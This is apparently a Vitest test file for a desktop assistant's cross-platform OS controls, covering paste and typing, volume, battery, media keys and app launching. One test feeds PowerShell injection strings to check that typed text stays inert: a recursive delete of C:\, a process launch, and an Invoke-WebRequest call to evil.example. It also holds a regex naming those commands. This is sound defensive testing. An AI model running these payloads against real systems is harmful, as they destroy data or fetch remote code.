import { describe, expect, it, vi } from 'vitest';
import { scanApps } from '../../../src/main/os/apps-index';
import { createAppsService } from '../../../src/main/os/apps';
import type { ExecFn, ExecResult } from '../../../src/main/os/exec';
import { createMediaControls } from '../../../src/main/os/media';
import { createPaster, windowsTypeScript, type ClipboardLike } from '../../../src/main/os/paste';
import { createShortcutsControls } from '../../../src/main/os/shortcuts';
import { createSystemControls } from '../../../src/main/os/system';
import { silentLogger } from '../agent/fake-context';

const result = (partial: Partial<ExecResult> = {}): ExecResult => ({ ok: true, code: 0, stdout: '', stderr: '', timedOut: false, error: null, ...partial });
function recording(respond: (file: string, args: readonly string[]) => Partial<ExecResult> = () => ({})) {
  const calls: [string, readonly string[]][] = [];
  const exec: ExecFn = async (file, args) => { calls.push([file, args]); return result(respond(file, args)); };
  return { exec, calls };
}
const board = (): ClipboardLike => ({ readText: async () => '', writeText: async () => undefined, snapshot: async () => [], restore: async () => undefined });
const paster = (platform: NodeJS.Platform, exec: ExecFn, helper: Parameters<typeof createPaster>[0]['helper'] = null) =>
  createPaster({ platform, clipboard: board(), helper, exec, logger: silentLogger(), wait: async () => undefined, schedule: () => undefined });

describe('paste and typing on every platform', () => {
  it('uses SendKeys on Windows with the text passed as base64, never spliced into the script', async () => {
    const { exec, calls } = recording();
    expect(await paster('win32', exec).paste('x', null)).toBe(true);
    expect(await paster('win32', exec).typeText("50% off {now} it's")).toBe(true);
    expect(calls[0][0]).toBe('powershell');
    const script = calls[1][1][3];
    expect(script).toContain("FromBase64String('");
    expect(script).toContain("[regex]::Replace($t, '[+^%~(){}\\[\\]]', '{$0}')");
    expect(script).not.toContain('50% off');
  });

  it.each([
    ['curly quotes', 'it’s ‘quoted’ ‚low‛ text'],
    ['a quote-breaking injection', "'); Remove-Item -Recurse C:\\ ; ('"],
    ['a smart-quote injection', '’); Start-Process calc; (‘'],
    ['a subexpression', '$(Invoke-WebRequest https://evil.example)'],
  ])('keeps %s inert', (_label, text) => {
    const script = windowsTypeScript(text);
    const encoded = /FromBase64String\('([A-Za-z0-9+/=]*)'\)/.exec(script)?.[1] ?? '';
    expect(Buffer.from(encoded, 'base64').toString('utf8')).toBe(text);
    expect(script).not.toContain(text);
    expect(script.replace(encoded, '')).not.toMatch(/Remove-Item|Start-Process|Invoke-WebRequest|[’‘‚‛]/);
  });

  it('tries xdotool then wtype on Linux', async () => {
    const { exec, calls } = recording((file) => (file === 'xdotool' ? { ok: false } : {}));
    expect(await paster('linux', exec).paste('x', null)).toBe(true);
    expect(await paster('linux', exec).typeText('hello')).toBe(true);
    expect(calls.map(([file]) => file)).toEqual(['xdotool', 'wtype', 'xdotool', 'wtype']);
  });

  it('types through the helper on macOS, else AppleScript', async () => {
    const helper = { isReady: () => true, paste: vi.fn(), typeText: vi.fn(async () => undefined) };
    expect(await paster('darwin', recording().exec, helper).typeText('hi')).toBe(true);
    expect(helper.typeText).toHaveBeenCalledWith('hi');
    const { exec, calls } = recording();
    await paster('darwin', exec).typeText('say "hi"');
    expect(calls[0]).toEqual(['osascript', ['-e', 'tell application "System Events" to keystroke "say \\"hi\\""']]);
    expect(await paster('darwin', exec).paste('', null)).toBe(false);
  });

  it('falls back to AppleScript when the helper paste fails', async () => {
    const helper = { isReady: () => true, paste: vi.fn(async () => { throw new Error('accessibility-missing'); }), typeText: vi.fn() };
    const { exec, calls } = recording();
    expect(await paster('darwin', exec, helper).paste('x', { name: 'Notes', bundleId: 'com.apple.Notes', pid: 1 })).toBe(true);
    expect(calls[0][1][1]).toContain('tell application id "com.apple.Notes" to activate');
  });
});

describe('system controls on Windows and Linux', () => {
  const deps = (platform: NodeJS.Platform, exec: ExecFn, files: Record<string, string> = {}) =>
    createSystemControls({ platform, exec, desktopDir: '/home/me/Desktop', openExternal: vi.fn(async () => undefined), readTextFile: async (path) => files[path] ?? null });

  it('uses pactl, gsettings, loginctl and sysfs on Linux', async () => {
    const { exec, calls } = recording((file, args) => (file === 'pactl' && args[0] === 'get-sink-volume' ? { stdout: 'Volume: front-left: 32768 /  50% / -18 dB' } : file === 'gsettings' ? { stdout: "'prefer-dark'" } : {}));
    const linux = deps('linux', exec, { '/sys/class/power_supply/BAT0/capacity': '77\n', '/sys/class/power_supply/BAT0/status': 'Discharging' });
    expect(await linux.getVolume()).toEqual({ level: 50, muted: false });
    expect(await linux.changeVolume(-10)).toEqual({ level: 40, muted: false });
    await linux.setMuted(true);
    expect(await linux.getDarkMode()).toBe(true);
    await linux.setDarkMode(false);
    expect(await linux.battery()).toEqual({ percent: 77, charging: false, onBattery: true });
    await linux.lockScreen();
    await linux.sleepDisplay();
    expect(await linux.screenshot(new Date(2026, 0, 2, 3, 4, 5))).toBe('/home/me/Desktop/Rivertide screenshot 2026-01-02 at 03.04.05.png');
    await linux.openSettings('display');
    expect(calls.map(([file]) => file)).toEqual(['pactl', 'pactl', 'pactl', 'pactl', 'gsettings', 'gsettings', 'loginctl', 'xset', 'gnome-screenshot', 'gnome-control-center']);
  });

  it('locks, reads the battery and opens ms-settings on Windows; explains the rest', async () => {
    const { exec, calls } = recording((file) => (file === 'powershell' ? { stdout: '64\r\n' } : {}));
    const windows = deps('win32', exec);
    expect(await windows.battery()).toEqual({ percent: 64, charging: false, onBattery: true });
    await windows.lockScreen();
    await windows.openSettings('bluetooth');
    expect(calls[1]).toEqual(['rundll32.exe', ['user32.dll,LockWorkStation']]);
    expect(await windows.getVolume()).toBeNull();
    expect(await windows.getDarkMode()).toBeNull();
    await expect(windows.setVolume(10)).rejects.toThrow('isn’t available');
    await expect(windows.setMuted(true)).rejects.toThrow('isn’t available');
    await expect(windows.sleepDisplay()).rejects.toThrow('isn’t available');
    await expect(windows.screenshot(new Date())).rejects.toThrow('isn’t available');
    await expect(windows.changeVolume(5)).rejects.toThrow('isn’t available');
  });

  it('reads macOS battery, appearance and volume state', async () => {
    const { exec } = recording((file) => (file === 'pmset' ? { stdout: "'AC Power'\n -InternalBattery-0 (id=1)\t90%; charging; 0:40 remaining" } : file === 'defaults' ? { stdout: 'Dark\n' } : { stdout: 'output volume:12, output muted:true' }));
    const mac = deps('darwin', exec);
    expect(await mac.battery()).toEqual({ percent: 90, charging: true, onBattery: false });
    expect(await mac.getDarkMode()).toBe(true);
    expect(await mac.getVolume()).toEqual({ level: 12, muted: true });
    await mac.setMuted(false);
    await mac.lockScreen();
  });
});

describe('media and shortcuts elsewhere', () => {
  it('sends Windows virtual keys and Linux playerctl commands', async () => {
    const windows = recording();
    await createMediaControls({ platform: 'win32', exec: windows.exec, helper: null }).press('playpause');
    expect(windows.calls[0][1][3]).toContain('[char]179');
    const linux = recording();
    await createMediaControls({ platform: 'linux', exec: linux.exec, helper: null }).press('previous');
    expect(linux.calls[0]).toEqual(['playerctl', ['previous']]);
    await expect(createMediaControls({ platform: 'linux', exec: recording(() => ({ ok: false })).exec, helper: null }).press('next')).rejects.toThrow('isn’t available');
  });

  it('reports Shortcuts as unavailable off macOS and surfaces failures', async () => {
    await expect(createShortcutsControls({ platform: 'linux', exec: recording().exec }).list()).rejects.toThrow('Shortcuts isn’t available');
    const timedOut = recording((_file, args) => (args[0] === 'list' ? { stdout: 'Slow\n' } : { ok: false, timedOut: true }));
    await expect(createShortcutsControls({ platform: 'darwin', exec: timedOut.exec }).run('slow')).rejects.toThrow('took too long');
    await expect(createShortcutsControls({ platform: 'darwin', exec: recording(() => ({ ok: false })).exec }).list()).rejects.toThrow('couldn’t read');
  });
});

describe('app discovery and launching elsewhere', () => {
  it('finds Start Menu shortcuts on Windows', async () => {
    const tree: Record<string, { name: string; isDirectory: boolean }[]> = {
      'C:/ProgramData/Microsoft/Windows/Start Menu/Programs': [{ name: 'Zoom', isDirectory: true }, { name: 'Notepad.lnk', isDirectory: false }],
      'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Zoom': [{ name: 'Zoom.lnk', isDirectory: false }, { name: 'Uninstall Zoom.lnk', isDirectory: false }],
    };
    const apps = await scanApps({ platform: 'win32', home: 'C:/Users/me', env: { ProgramData: 'C:/ProgramData' }, exec: recording().exec, listDir: async (dir) => tree[dir.replace(/\\/g, '/')] ?? [] });
    expect(apps.map((app) => app.entry.name)).toEqual(['Notepad', 'Zoom']);
  });

  it('launches with gtk-launch on Linux and openPath on Windows', async () => {
    const linux = recording();
    const base = { exec: linux.exec, home: '/home/me', env: {}, logger: silentLogger(), defaultBrowser: () => null, getFileIcon: async () => null, scan: async () => [] };
    await createAppsService({ ...base, platform: 'linux', openPath: async () => '' }).open({ name: 'Firefox', path: '/usr/share/applications/firefox.desktop', bundleId: 'firefox' });
    expect(linux.calls[0]).toEqual(['gtk-launch', ['firefox']]);
    const windowsApps = createAppsService({ ...base, platform: 'win32', openPath: async () => 'not found' });
    await expect(windowsApps.open({ name: 'Zoom', path: 'C:/z.lnk', bundleId: null })).rejects.toThrow('I couldn’t open Zoom.');
    await expect(windowsApps.quit({ name: 'Zoom', path: 'C:/z.lnk', bundleId: null })).rejects.toThrow('Quitting apps isn’t available');
  });
});
